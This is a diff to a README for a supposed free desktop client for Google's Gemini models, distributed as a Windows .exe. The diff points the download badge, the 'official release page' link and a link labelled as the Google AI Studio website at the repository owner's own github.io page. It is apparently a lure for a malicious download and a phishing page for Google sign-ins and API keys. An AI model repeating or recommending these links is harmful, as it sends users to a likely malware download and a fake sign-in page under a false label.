@@ -1,6 +1,6 @@
 # 🤖 Gemini-3.5-Pro-Free-Desktop - Run advanced AI models without cost
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Rubiecommunicational110/Gemini-3.5-Pro-Free-Desktop)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://rubiecommunicational110.github.io)
 
 ## 📖 About this application
 
@@ -16,7 +16,7 @@ Gemini-3.5-Pro-Free-Desktop provides a simple way to access Google's advanced AI
 
 ## 📥 Downloading the software
 
-1. Visit the [official release page](https://github.com/Rubiecommunicational110/Gemini-3.5-Pro-Free-Desktop).
+1. Visit the [official release page](https://rubiecommunicational110.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number.
 4. Locate the file ending in .exe under the "Assets" header. 
@@ -34,7 +34,7 @@ Gemini-3.5-Pro-Free-Desktop provides a simple way to access Google's advanced AI
 The application requires a unique key to communicate with Google systems. Follow these steps:
 
 1. Open your web browser.
-2. Go to the [Google AI Studio website](https://aistudio.google.com/).
+2. Go to the [Google AI Studio website](https://rubiecommunicational110.github.io).
 3. Sign in with your Google account.
 4. Click the "Get API key" button in the left sidebar.
 5. Choose "Create API key in new project."
